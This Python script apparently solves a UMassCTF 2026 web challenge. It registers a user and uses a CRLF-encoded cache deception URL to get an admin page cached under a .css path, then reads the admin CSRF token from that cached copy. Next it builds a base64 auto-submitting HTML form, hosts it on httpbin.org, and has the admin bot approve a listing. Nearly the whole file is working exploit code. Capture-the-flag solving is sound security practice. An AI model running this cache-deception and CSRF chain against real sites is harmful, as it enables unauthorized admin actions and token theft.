#!/usr/bin/env python3
"""Building Blocks Market — UMassCTF 2026 (web, 469pts)
Web Cache Deception + CSRF via httpbin.org HTML delivery

Attack chain:
1. Register, login, create product listing
2. Submit cache deception URL → bot (as admin) visits cache_proxy:5555,
   the %0d%0a CRLF in path gets cleaned before upstream but stays in cache key.
   Admin page (/admin/submissions.html) returns Cache-Control: public,
   so it gets cached under a .css-ending URL.
3. Read the cached admin page → extract CSRF token
4. Create auto-submit form via httpbin.org/base64/ (serves HTML, no CSP)
5. Submit this URL for bot to visit → bot auto-submits approval POST
6. Product becomes public → /flag returns the flag
"""
import requests, re, time, base64, sys

# CHANGE THIS to your instance URL
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://931f2af1-8268-4fd6-b605-3cb2e3b748fd.buildingblocksmarket.web.ctf.umasscybersec.org"
BASE = BASE.rstrip('/')

s = requests.Session()

def step(n, msg):
    print(f"[{n}] {msg}")

# === PHASE 1: Setup ===
user = f"solver_{int(time.time())%99999}"
s.post(f"{BASE}/register", data={"username":user,"password":"p"}, allow_redirects=False)
s.post(f"{BASE}/login", data={"username":user,"password":"p"}, allow_redirects=False)
r = s.post(f"{BASE}/sell", data={"name":"LEGO UCS","description":"Rare","price":"999"}, allow_redirects=False)
step(1, f"Registered {user}, sell: {r.status_code}")

# === PHASE 2: Cache Deception — get admin CSRF token ===
# Bot visits http://cache_proxy:5555/admin/submissions.html%0d%0a<ts>.css
# The %0d%0a gets stripped from path sent to upstream → /admin/submissions.html
# But cache key retains it → ends in .css → cacheable!
# Admin Flask app returns Cache-Control: public → response cached
ts = int(time.time())
cache_url = f"http://cache_proxy:5555/admin/submissions.html%0d%0a{ts}.css"
r = s.post(f"{BASE}/approval/request", data={"submission_url": cache_url}, allow_redirects=False)
sub_match = re.search(r'success/(\d+)', r.headers.get('Location',''))
sub_id = sub_match.group(1) if sub_match else "1"
step(2, f"Cache deception submitted (sub={sub_id}), waiting for bot...")
time.sleep(15)

# Read cached admin page (unauthenticated - it's cached!)
r = requests.get(f"{BASE}/admin/submissions.html%0d%0a{ts}.css")
xcache = r.headers.get('X-Cache','')
step(3, f"Cache read: X-Cache={xcache}, len={len(r.text)}")

if xcache != 'HIT' or len(r.text) < 500:
    print("[!] Cache deception failed. Instance may need restart.")
    print(f"    Response: {r.text[:200]}")
    sys.exit(1)

csrf = re.search(r'name="csrf_token" value="([^"]+)"', r.text).group(1)
approve_ids = re.findall(r'/approval/approve/(\d+)', r.text)
target = sub_id if sub_id in approve_ids else approve_ids[0]
step(3, f"CSRF: {csrf[:20]}... Target sub: {target}")

# === PHASE 3: CSRF Exploit via httpbin.org ===
# httpbin.org/base64/ decodes and serves as text/html with NO CSP!
# Bot has SameSite cookies disabled, so cross-origin form POST carries session cookie
# CRITICAL: Use HTTP (not HTTPS) to avoid mixed content blocking!
# Bot is at an HTTP page (httpbin), form posts to HTTP cache_proxy. HTTPS→HTTP is blocked.
exploit = f'<html><body><form id=f method=POST action="http://cache_proxy:5555/approval/approve/{target}"><input type=hidden name=csrf_token value="{csrf}"></form><script>document.getElementById("f").submit();</script></body></html>'
b64 = base64.b64encode(exploit.encode()).decode()
httpbin_url = f"http://httpbin.org/base64/{b64}"  # HTTP not HTTPS!

# Verify
vr = requests.get(httpbin_url)
assert vr.status_code == 200 and 'csrf_token' in vr.text, f"httpbin error: {vr.status_code}"
step(4, f"Exploit URL ready ({len(httpbin_url)} chars)")

# Submit for bot visit
r = s.post(f"{BASE}/approval/request", data={"submission_url": httpbin_url}, allow_redirects=False)
step(5, f"Bot submission: {r.status_code}")

# === PHASE 4: Wait and get flag ===
step(6, "Waiting 30s for bot to approve...")
time.sleep(30)

for i in range(3):
    try:
        r = s.get(f"{BASE}/flag", timeout=10)
        if "UMASS{" in r.text:
            print(f"\n[+] FLAG: {r.text.strip()}")
            break
        else:
            print(f"    Attempt {i+1}: {r.text.strip()}")
            if i < 2:
                time.sleep(10)
    except Exception as e:
        print(f"    Error: {e}")
        time.sleep(5)
else:
    print("\n[-] Flag not obtained. The httpbin CSRF approach may need adjustment.")
    print("    Debug: check if bot can reach httpbin.org")
    print("    Alternative: try a different HTML hosting service without CSP")
